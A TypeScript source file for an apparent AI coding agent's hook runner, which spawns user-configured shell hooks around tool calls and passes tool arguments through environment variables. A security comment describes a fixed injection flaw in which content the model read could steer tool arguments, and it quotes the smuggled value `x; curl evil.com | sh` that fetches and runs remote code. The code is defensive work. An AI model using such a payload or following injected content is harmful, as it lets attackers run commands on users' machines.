import { spawn, type ChildProcess } from "node:child_process";
import type { HookEntry, PhaseHooks } from "./config.js";

const DEFAULT_TIMEOUT_MS = 10_000;

/** Kills the whole process tree, not just the shell. On Windows the hook
 * command is spawned through cmd.exe, so child.kill() would terminate only
 * the shell and orphan any real work underneath it (a stray node/npx keeps
 * running indefinitely, holding pipes open). taskkill /T walks the tree. */
function killTree(child: ChildProcess): void {
  if (child.pid === undefined || child.exitCode !== null || child.signalCode !== null) {
    return;
  }
  if (process.platform === "win32") {
    spawn("taskkill", ["/pid", String(child.pid), "/T", "/F"], { stdio: "ignore" });
  } else {
    child.kill("SIGTERM");
  }
}

export interface HookInvocation {
  tool: string;
  args: unknown;
  cwd: string;
}

export interface HookOutcome {
  blocked: boolean;
  reasons: string[];
  notices: string[];
}

/**
 * SECURITY: tool arguments reach hooks as environment variables and as the
 * JSON payload on stdin — never by substitution into the command string.
 *
 * An earlier version spliced `args[key]` into `hook.run` before handing it
 * to a `shell: true` spawn. Tool arguments are chosen by the model, and the
 * model's choices can be steered by whatever it just read (a file, a
 * webfetch result, an MCP response), so an audit hook as innocuous as
 * `echo $path >> log.txt` became arbitrary command execution the moment a
 * path came back as `x; curl evil.com | sh`. Environment variables carry
 * the same data with none of that: the shell expands `$STAK_TOOL_ARGS` to
 * one value and never re-parses it as syntax.
 */
export function hookEnv(
  invocation: HookInvocation,
  phase: "beforeTool" | "afterTool",
): NodeJS.ProcessEnv {
  return {
    ...process.env,
    STAK_HOOK_PHASE: phase,
    STAK_TOOL_NAME: invocation.tool,
    STAK_TOOL_ARGS: JSON.stringify(invocation.args ?? null),
    STAK_PROJECT_DIR: invocation.cwd,
  };
}

export class HookRunner {
  private readonly hooks: PhaseHooks;

  constructor(hooks: PhaseHooks) {
    this.hooks = hooks;
  }

  async run(
    phase: "beforeTool" | "afterTool",
    invocation: HookInvocation,
  ): Promise<HookOutcome> {
    const outcome: HookOutcome = { blocked: false, reasons: [], notices: [] };
    const entries = this.hooks[phase];
    if (entries.length === 0) return outcome;

    const payload = JSON.stringify({ ...invocation, phase });
    for (const hook of entries) {
      if (
        hook.match !== undefined &&
        !new RegExp(hook.match).test(invocation.tool)
      ) {
        continue;
      }
      const result = await this.spawnOne(hook, payload, invocation, phase);
      if (result.ok) continue;

      const detail = result.stderr.trim();
      if (phase === "beforeTool") {
        outcome.blocked = true;
        outcome.reasons.push(
          detail !== ""
            ? `blocked by hook "${hook.name}": ${detail}`
            : `blocked by hook "${hook.name}" (exit ${result.code ?? "signal"}).`,
        );
      } else {
        outcome.notices.push(
          detail !== ""
            ? `hook "${hook.name}" failed: ${detail}`
            : `hook "${hook.name}" failed with exit ${result.code ?? "signal"}.`,
        );
      }
    }
    return outcome;
  }

  private spawnOne(
    hook: HookEntry,
    payload: string,
    invocation: HookInvocation,
    phase: "beforeTool" | "afterTool",
  ): Promise<{ ok: boolean; code: number | null; stderr: string }> {
    // Entries built outside parseHooks (tests, future programmatic callers)
    // may omit timeout — fall back rather than letting setTimeout treat
    // undefined as an instant fire.
    const timeoutMs = hook.timeout ?? DEFAULT_TIMEOUT_MS;
    return new Promise((resolve) => {
      // Default stdio pipes all three streams: stdout must be drained so
      // chatty hooks can't deadlock on a full pipe buffer, stderr is captured
      // to explain vetoes and failures.
      // hook.run is spawned verbatim — the only strings the shell ever sees
      // come from the user's own config, never from model-chosen tool args.
      const child = spawn(hook.run, {
        shell: true,
        cwd: invocation.cwd,
        env: hookEnv(invocation, phase),
      });
      let stderr = "";
      let settled = false;
      const timer = setTimeout(() => {
        if (settled) return;
        settled = true;
        killTree(child);
        resolve({
          ok: false,
          code: null,
          stderr: `${stderr}\nhook timed out after ${timeoutMs}ms`,
        });
      }, timeoutMs);

      child.stdout.on("data", () => {});
      child.stderr.on("data", (chunk) => {
        stderr += chunk.toString();
      });
      child.on("error", (error) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        resolve({ ok: false, code: null, stderr: `${stderr}\n${error.message}` });
      });
      child.on("close", (code) => {
        if (settled) return;
        settled = true;
        clearTimeout(timer);
        resolve({ ok: code === 0, code, stderr });
      });

      child.stdin?.end(payload);
    });
  }
}
